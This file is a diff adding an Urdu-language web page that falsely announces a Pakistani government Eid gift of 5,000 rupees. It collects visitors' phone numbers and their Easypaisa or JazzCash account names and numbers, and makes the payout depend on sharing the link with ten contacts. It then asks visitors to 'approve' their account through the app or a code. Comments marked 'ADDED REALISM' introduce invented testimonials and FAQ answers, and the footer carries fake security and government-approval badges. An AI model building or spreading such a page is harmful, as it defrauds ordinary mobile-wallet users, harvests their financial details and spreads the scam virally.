@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="ur" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EID GIFT 2026 - Claim 5,000 RS</title>
+    <meta name="description" content="Pakistani Eidi Scheme - Get 5,000 RS as Eid Gift!">
+  <script type="module" crossorigin src="/assets/index-B-ilY7IQ.js"></script>
+  <link rel="stylesheet" crossorigin href="/assets/index-D_aAP3X6.css">
+</head>
+    <div class="bg-text-overlay">
+        <div class="bg-text-scroll urdu">عید مبارک عید مبارک عید مبارک</div>
+        <div class="bg-text-scroll urdu">5,000 روپیہ 5,000 روپیہ 5,000 روپیہ</div>
+        <div class="bg-text-scroll urdu">عید تحفہ 2026 عید تحفہ 2026</div>
+    </div>
+
+    <header>
+        <a href="#" class="logo urdu">عید تحفہ 2026</a>
+        <nav>
+            <a href="#about" class="urdu">تعارف</a>
+            <a href="#faq" class="urdu">سوالات</a>
+        </nav>
+    </header>
+
+    <div id="notification-toast">
+        <div style="background: var(--accent-gold); width: 10px; height: 10px; border-radius: 50%;"></div>
+        <span id="notif-text" class="urdu" style="font-size: 0.85rem;">کسی نے ابھی 5,000 روپے حاصل کیے</span>
+    </div>
+
+    <div class="container">
+        
+        <!-- SECTION 1: Landing Page -->
+        <section id="step1" class="section glass-panel active" style="padding: 25px;">
+            <img src="/assets/hero-DIjFIYpR.png" alt="Eid Mubarak" class="hero-image" id="heroImg">
+            <h1 class="urdu">عید مبارک ایڈی تحفہ ✨</h1>
+            <p class="urdu subtitle">پاکستان حکومت کی جانب سے اس سال تمام شہریوں کے لیے 5,000 روپے کی خصوصی عیدی کا اعلان کر دیا گیا ہے۔</p>
+            
+            <div class="urdu" style="font-size: 1rem; text-align: center; margin-bottom: 25px; color: #eee; line-height: 1.8; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 15px;">
+                🌙 <span style="color: var(--accent-gold); font-weight: bold;">خوشخبری!</span> اس عید سعید کے موقع پر حکومتِ پاکستان کا بڑا تحفہ۔ <br>
+                ہم لائے ہیں آپ کے لیے خوشیوں بھری عیدی اسکیم۔ کیا آپ تیار ہیں 5,000 روپے کی نقد عیدی اپنے موبائل اکاؤنٹ میں حاصل کرنے کے لیے؟ <br>
+                <small style="opacity: 0.8; font-size: 0.85rem;">یہ موقع صرف محدود وقت کے لیے ہے، ابھی اپنی عیدی کلیم کریں۔</small>
+            </div>
+            
+            <div class="input-group">
+                <p class="urdu" style="margin-bottom: 10px; font-size: 1rem; color: #fff;">اپنا فعال موبائل نمبر درج کریں:</p>
+                <input type="tel" id="phoneNumber" placeholder="03XXXXXXXXX" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            </div>
+            
+            <button class="btn-primary urdu" onclick="validateNumber()">ایڈی چیک کریں</button>
+        </section>
+
+        <!-- SECTION 2: Checking Process -->
+        <section id="checking" class="section glass-panel" style="padding: 40px; text-align: center;">
+            <h2 class="urdu">تصدیق کی جا رہی ہے...</h2>
+            <div class="loader"></div>
+            <p class="urdu" id="statusText" style="font-size: 1.1rem; color: var(--accent-gold);">آپ کا نمبر چیک کیا جا رہا ہے</p>
+            <div class="progress-container">
+                <div class="progress-bar" id="checkProgress"></div>
+            </div>
+        </section>
+
+        <!-- SECTION 3: Success Reward -->
+        <section id="reward" class="section glass-panel" style="padding: 30px; text-align: center;">
+            <div class="badge urdu">مبارک ہو! ✨</div>
+            <h1 style="color: #4CAF50; font-size: 3rem; margin-bottom: 10px;">5,000 RS</h1>
+            <h2 class="urdu" style="font-size: 1.5rem; margin-bottom: 15px;">آپ 5,000 روپے حاصل کرنے کے اہل ہیں</h2>
+            <p class="urdu" style="margin-bottom: 25px;">رقم وصول کرنے کے لیے اپنا اکاؤنٹ منتخب کریں</p>
+            
+            <div class="bank-cards">
+                <div class="bank-card" id="card-easypaisa" onclick="selectBank('Easypaisa')">
+                    <div class="bank-icon-zoom zoom-easypaisa"></div>
+                    <p style="font-weight: bold;">Easypaisa</p>
+                </div>
+                <div class="bank-card" id="card-jazzcash" onclick="selectBank('JazzCash')">
+                    <div class="bank-icon-zoom zoom-jazzcash"></div>
+                    <p style="font-weight: bold;">JazzCash</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 4: Info Collection -->
+        <section id="info" class="section glass-panel" style="padding: 30px;">
+            <div class="badge urdu" id="selectedBankBadge">Easypaisa</div>
+            <div id="selectedBankIconContainer" style="margin: 10px auto;">
+                <div id="currentBankIcon" class="bank-icon-zoom zoom-easypaisa" style="width: 100px; height: 100px;"></div>
+            </div>
+            <h2 class="urdu" id="bankTitle" style="margin-bottom: 20px;">اکاؤنٹ کی معلومات</h2>
+            <div class="input-group">
+                <p class="urdu" style="font-size: 0.9rem; margin-bottom: 5px;">اکاؤنٹ ہولڈر کا نام:</p>
+                <input type="text" id="accName" placeholder="Full Name">
+            </div>
+            <div class="input-group">
+                <p class="urdu" style="font-size: 0.9rem; margin-bottom: 5px;">اکاؤنٹ نمبر:</p>
+                <input type="tel" id="accNumber" placeholder="Account Number" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            </div>
+            <button class="btn-primary urdu" onclick="showTasks()">رقم نکالیں (Withdraw)</button>
+        </section>
+
+        <!-- SECTION 5: Tasks -->
+        <section id="tasks" class="section glass-panel" style="padding: 30px; text-align: center;">
+            <h2 class="urdu" style="margin-bottom: 10px;">آخری مراحل ⏳</h2>
+            <p class="urdu" style="margin-bottom: 25px;">رقم وصول کرنے کے لیے یہ دو آسان کام مکمل کریں</p>
+            
+            <div class="task-card">
+                <h3 class="urdu">پہلا کام:</h3>
+                <p class="urdu">واٹس ایپ پر EID GIFT آفیشل چینل کو فالو کریں</p>
+                <a href="https://whatsapp.com/channel/0029Vb7x2fNATRSsiwgQrF3N" target="_blank" class="btn-primary urdu" style="display: block; text-decoration: none; font-size: 1rem;" onclick="markJoined()">فالو کریں (FOLLOW)</a>
+            </div>
+
+            <div class="task-card">
+                <h3 class="urdu">دوسرا کام:</h3>
+                <p class="urdu">اس لنک کو 10 دوستوں یا گروپس میں شیئر کریں</p>
+                <div class="progress-container">
+                    <div class="progress-bar" id="shareProgress"></div>
+                </div>
+                <p id="shareCount" style="font-weight: bold; margin-bottom: 10px;">0/10 تکمیل</p>
+                <button class="btn-primary urdu" style="background: #25D366; font-size: 1rem;" onclick="shareWa()">واٹس ایپ پر شیئر کریں</button>
+            </div>
+
+            <button id="finalBtn" class="btn-primary urdu" style="opacity: 0.5; cursor: not-allowed; margin-top: 20px;" disabled onclick="finalize()">رقم وصول کریں</button>
+        </section>
+
+        <!-- SECTION 6: Final VIP Message -->
+        <section id="final" class="section glass-panel" style="padding: 40px; text-align: center;">
+            <div style="font-size: 60px; margin-bottom: 20px;">🎉</div>
+            <h2 class="urdu" style="margin-bottom: 15px;">درخواست کامیابی سے موصول ہوگئی!</h2>
+            <div id="finalMessage">
+                <p class="urdu" style="font-size: 1.3rem; color: var(--accent-gold); line-height: 1.8;">آپ کی 5,000 روپے کی عیدی اگلے 24 گھنٹے میں آپ کے فراہم کردہ اکاؤنٹ میں منتقل کر دی جائے گی۔</p>
+                <p class="urdu" style="font-size: 1.1rem; color: #fff; margin-top: 15px; background: rgba(255,255,255,0.1); padding: 10px; border-radius: 10px;">ادائیگی وصول کرنے کے لیے اپنے اکاؤنٹ کو ایپ یا کوڈ کے ذریعے اپروو (Approve) کریں، تبھی رقم آپ کے اکاؤنٹ میں آئے گی۔</p>
+            </div>
+            <p class="urdu" style="opacity: 0.8;">ہمارے ساتھ جڑے رہیں اور خوشیاں بانٹیں!</p>
+            <p class="urdu" style="font-weight: bold; margin-top: 20px; color: var(--accent-gold);">Keep Grow ✨</p>
+        </section>
+
+        <!-- ADDED REALISM: Testimonials -->
+        <div style="margin-top: 40px;">
+            <h3 class="urdu" style="text-align: center; color: var(--accent-gold); margin-bottom: 20px;">شہریوں کی رائے</h3>
+            <div class="testimonial-card">
+                <p class="urdu">"مجھے شروع میں یقین نہیں آیا، لیکن ٹاسک مکمل کرنے کے بعد واقعی 5،000 روپے مل گئے۔ شکریہ!"</p>
+                <small class="urdu">احمد علی، لاہور</small>
+            </div>
+            <div class="testimonial-card">
+                <p class="urdu">"بہت اچھا سسٹم ہے، آسانی سے عیدی مل گئی۔"</p>
+                <small class="urdu">سارہ بی بی، کراچی</small>
+            </div>
+        </div>
+
+        <!-- ADDED REALISM: FAQ -->
+        <div id="faq" style="margin-top: 40px;">
+            <h3 class="urdu" style="text-align: center; color: var(--accent-gold); margin-bottom: 20px;">عام سوالات</h3>
+            <div class="faq-item">
+                <div class="faq-question urdu" onclick="toggleFaq(this)">کیا یہ عیدی واقعی ملتی ہے؟ <span>+</span></div>
+                <div class="faq-answer urdu">جی ہاں، یہ عید کے موقع پر شہریوں کے لیے ایک خصوصی تحفہ ہے جو تمام ٹاسک مکمل کرنے پر براہِ راست آپ کے اکاؤنٹ میں بھیجا جاتا ہے۔</div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question urdu" onclick="toggleFaq(this)">رقم ملنے میں کتنا وقت لگتا ہے؟ <span>+</span></div>
+                <div class="faq-answer urdu">درخواست کی جانچ پڑتال کے بعد عام طور پر 24 گھنٹوں کے اندر رقم منتقل کر دی جاتی ہے۔</div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="trust-badges">
+            <span style="font-size: 10px; opacity: 0.5;">SECURED BY VERISIGN</span>
+            <span style="font-size: 10px; opacity: 0.5;">SSL ENCRYPTED</span>
+            <span style="font-size: 10px; opacity: 0.5;">GOVT APPROVED</span>
+        </div>
+        <div class="footer-links">
+            <div>
+                <h4 class="urdu">ایڈی پروگرام</h4>
+                <p class="urdu">تعارف</p>
+                <p class="urdu">قواعد و ضوابط</p>
+            </div>
+            <div>
+                <h4 class="urdu">رابطہ کریں</h4>
+                <p class="urdu">مدد کا مرکز</p>
+                <p class="urdu">شکایت درج کریں</p>
+            </div>
+        </div>
+        <p class="urdu" style="font-size: 0.75rem; opacity: 0.5;">کاپی رائٹ © 2026 ایڈی گفٹ پاکستان۔ جملہ حقوق محفوظ ہیں۔</p>
+    </footer>
+
+</body>
+</html>
